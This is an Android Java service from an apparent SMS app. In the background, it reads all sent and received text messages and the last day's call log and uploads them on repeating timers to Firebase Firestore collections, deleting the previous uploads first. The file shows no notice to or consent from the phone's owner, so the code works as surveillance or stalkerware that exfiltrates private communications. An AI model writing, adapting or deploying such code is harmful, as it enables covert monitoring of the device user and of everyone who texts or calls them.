package com.example.ghazi.sms;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.*;
import android.provider.CallLog;
import android.support.annotation.WorkerThread;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.android.gms.tasks.Tasks;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FieldPath;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QuerySnapshot;
import com.google.firebase.firestore.WriteBatch;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Callable;
import java.util.concurrent.Executor;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class MyService extends Service {
    final int REQUEST_CODE_ASK_PERMISSIONS = 123;
    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final ThreadPoolExecutor EXECUTOR = new ThreadPoolExecutor(2, 4, 60,
                TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        final CollectionReference refSmsReceivedCollection = db.collection("ReceivedSMS");
        final CollectionReference refSmsSentCollection = db.collection("SentSMS");
        final CollectionReference refCallLogsCollection=db.collection("CallLogs");

        final long period = 1000;
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                // do your task here
                deleteCollection(refCallLogsCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        Log.d("dandoun", " successfully deleted!");
                        sendCallLogToDB(getCallDetails());


                    }
                });




            }
        }, 0, period*60*5);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                // do your task here
                deleteCollection(refSmsSentCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        Log.d("dandoun", " successfully deleted!");
                        sendSentSMSToDB(getSentSMSs());


                    }
                });
                ;
                //sendSentSMSToDB(getSentSMSs());
            }
        }, period * 5, period * 86400);

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                // do your task here

                deleteCollection(refSmsReceivedCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        Log.d("dandoun", " successfully deleted!");
                        sendReceivedSMSToDB(getReceivedSMSs());


                    }
                });

            }
        }, period * 2, period * 86400);

        return START_STICKY;
    }

    public void sendCallLogToDB(ArrayList<com.example.ghazi.sms.CallLog> listCallLogs) {
        //firebase
        Map<String, Object> callLog = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("CallLogs");

        for(int i=0;i<listCallLogs.size();i++){
            DocumentReference document=collection.document();
            callLog.put("callType",listCallLogs.get(i).getCallType());
            callLog.put("phonenNumber",listCallLogs.get(i).getPhoneNumber());
            callLog.put("callDate",listCallLogs.get(i).getCallDate());
            callLog.put("callDurationSeconds",listCallLogs.get(i).getCallDurationSeconds());
            document.set(callLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d("", "your call Log was added successfully" );
                }
            });

        }
    }

    public ArrayList<com.example.ghazi.sms.CallLog> getCallDetails() {

        ArrayList<com.example.ghazi.sms.CallLog> callLogs= new ArrayList<com.example.ghazi.sms.CallLog>();
        StringBuffer sb = new StringBuffer();


        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {


            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.DAY_OF_YEAR, -1);
            Date weekBefore = calendar.getTime();

            String selection = CallLog.Calls.DATE + ">?";
            String [] selectionArgs = {String.valueOf(weekBefore.getTime())};
            //Cursor cr = managedQuery(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, null);


            Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                    selection, selectionArgs, CallLog.Calls.DATE + " ASC");
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            //Toast.makeText(this, "hahahghk", Toast.LENGTH_LONG).show();
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");
            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                callLogs.add(new com.example.ghazi.sms.CallLog(phNumber,dir,callDayTime,callDuration));
            }

            // close it or no ?
            // managedCursor.close();
        }

        //return sb.toString();
        return callLogs;

    }


    @WorkerThread
    private List<DocumentSnapshot> deleteQueryBatch(final Query query) throws Exception {
        QuerySnapshot querySnapshot = Tasks.await(query.get());

        WriteBatch batch = query.getFirestore().batch();
        for (DocumentSnapshot snapshot : querySnapshot) {
            batch.delete(snapshot.getReference());
        }
        Tasks.await(batch.commit());

        return querySnapshot.getDocuments();
    }
    private Task<Void> deleteCollection(final CollectionReference collection,
                                        final int batchSize,
                                        Executor executor) {

        // Perform the delete operation on the provided Executor, which allows us to use
        // simpler synchronous logic without blocking the main thread.
        return Tasks.call(executor, new Callable<Void>() {
            @Override
            public Void call() throws Exception {
                // Get the first batch of documents in the collection
                Query query = collection.orderBy(FieldPath.documentId()).limit(batchSize);

                // Get a list of deleted documents
                List<DocumentSnapshot> deleted = deleteQueryBatch(query);

                // While the deleted documents in the last batch indicate that there
                // may still be more documents in the collection, page down to the
                // next batch and delete again
                while (deleted.size() >= batchSize) {
                    // Move the query cursor to start after the last doc in the batch
                    DocumentSnapshot last = deleted.get(deleted.size() - 1);
                    query = collection.orderBy(FieldPath.documentId())
                            .startAfter(last.getId())
                            .limit(batchSize);

                    deleted = deleteQueryBatch(query);
                }

                return null;
            }
        });

    }




    public ArrayList<Sms> getSentSMSs(){

        ArrayList<Sms> smsList= new ArrayList<Sms>();
        //ActivityCompat.requestPermissions(MyService.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    }
                    //Toast.makeText(this, "" + msgData, Toast.LENGTH_SHORT).show();
                    // String body=cursor.getString(12);
                    String body= cursor.getString(cursor.getColumnIndex("body"));
                    String address= cursor.getString(cursor.getColumnIndex("address"));

                    //Log.d("hhhh",body+ ":::"+address);
                    smsList.add(new Sms(address,body));
                } while (cursor.moveToNext());
            }
        }
        return smsList;
    }

    public void sendSentSMSToDB(ArrayList<Sms> listSMS) {

        Map<String, Object> sms = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("SentSMS");

        for(int i=0;i<listSMS.size();i++){
            DocumentReference document=collection.document();
            sms.put("address",listSMS.get(i).getAddress());
            sms.put("body",listSMS.get(i).getBody());
            document.set(sms).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d("5ra", "your sms was added successfully" );
                }
            });

        }
    }

    private void sendReceivedSMSToDB(ArrayList<Sms> listSMS) {

        Map<String, Object> sms = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("ReceivedSMS");

        for(int i=0;i<listSMS.size();i++){
            DocumentReference document=collection.document();
            sms.put("address",listSMS.get(i).getAddress());
            sms.put("body",listSMS.get(i).getBody());
            document.set(sms).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d("tag", "your sms was added successfully" );
                }
            });

        }
    }

    public ArrayList<Sms> getReceivedSMSs(){

        ArrayList<Sms> smsList= new ArrayList<Sms>();
       // ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    }
                    //Toast.makeText(this, "" + msgData, Toast.LENGTH_SHORT).show();
                    // String body=cursor.getString(12);
                    String body= cursor.getString(cursor.getColumnIndex("body"));
                    String address= cursor.getString(cursor.getColumnIndex("address"));

                    //Log.d("hhhh",body+ ":::"+address);
                    smsList.add(new Sms(address,body));
                } while (cursor.moveToNext());
            }
        }
        return smsList;
    }


}
